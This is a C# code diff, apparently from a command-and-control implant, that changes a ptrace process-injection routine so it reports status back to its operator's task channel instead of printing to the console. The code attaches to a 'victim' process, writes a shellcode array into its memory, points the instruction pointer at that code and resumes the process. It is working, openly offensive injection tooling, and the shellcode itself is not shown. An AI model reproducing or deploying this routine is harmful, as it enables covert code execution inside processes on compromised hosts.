@@ -46,25 +46,25 @@ namespace Agent
             long victimPid = (long)args.pid;
             if (victimPid == 0 || victimPid > pidMax)
             {
-                Console.WriteLine("Argument not a valid number. Aborting.");
+                await messageManager.WriteLine("Argument not a valid number. Aborting.", job.task.id, true, "error");
                 return;
             }
 
             // Attach to the victim process.
             if (PTrace.PtraceAttach(victimPid) < 0)
             {
-                Console.WriteLine($"Failed to PTRACE_ATTACH: {Marshal.GetLastWin32Error()}");
+                await messageManager.WriteLine($"Failed to PTRACE_ATTACH: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                 return;
             }
             PTrace.Wait(null);
 
-            Console.WriteLine($"[*] Attach to the process with PID {victimPid}.");
+            await messageManager.WriteLine($"[*] Attach to the process with PID {victimPid}.", job.task.id, false);
 
             // Save old register state.
             PTrace.UserRegs oldRegs;
             if (PTrace.PtraceGetRegs(victimPid, out oldRegs) < 0)
             {
-                Console.WriteLine($"Failed to PTRACE_GETREGS: {Marshal.GetLastWin32Error()}");
+                await messageManager.WriteLine($"Failed to PTRACE_GETREGS: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                 return;
             }
 
@@ -73,35 +73,35 @@ namespace Agent
             int payloadSize = SHELLCODE.Length;
             ulong[] payload = new ulong[payloadSize / 8];
 
-            Console.WriteLine($"[*] Injecting payload at address 0x{address:X}.");
+            await messageManager.WriteLine($"[*] Injecting payload at address 0x{address:X}.", job.task.id, false);
 
             for (int i = 0; i < payloadSize; i += 8)
             {
                 ulong value = BitConverter.ToUInt64(SHELLCODE, i);
                 if (PTrace.PtracePokeText(victimPid, address + i, value) < 0)
                 {
-                    Console.WriteLine($"Failed to PTRACE_POKETEXT: {Marshal.GetLastWin32Error()}");
+                    await messageManager.WriteLine($"Failed to PTRACE_POKETEXT: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                     return;
                 }
             }
 
-            Console.WriteLine("[*] Jumping to the injected code.");
+            await messageManager.WriteLine("[*] Jumping to the injected code.", job.task.id, true, "error");
             PTrace.UserRegs regs = oldRegs;
             regs.rip = (ulong)address;
 
             if (PTrace.PtraceSetRegs(victimPid, regs) < 0)
             {
-                Console.WriteLine($"Failed to PTRACE_SETREGS: {Marshal.GetLastWin32Error()}");
+                await messageManager.WriteLine($"Failed to PTRACE_SETREGS: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                 return;
             }
 
             if (PTrace.PtraceCont(victimPid, IntPtr.Zero) < 0)
             {
-                Console.WriteLine($"Failed to PTRACE_CONT: {Marshal.GetLastWin32Error()}");
+                await messageManager.WriteLine($"Failed to PTRACE_CONT: {Marshal.GetLastWin32Error()}", job.task.id, true, "error");
                 return;
             }
 
-            Console.WriteLine("[*] Successfully injected and jumped to the code.");
+            await messageManager.WriteLine("[*] Successfully injected and jumped to the code.", job.task.id, true);
 
 
         }
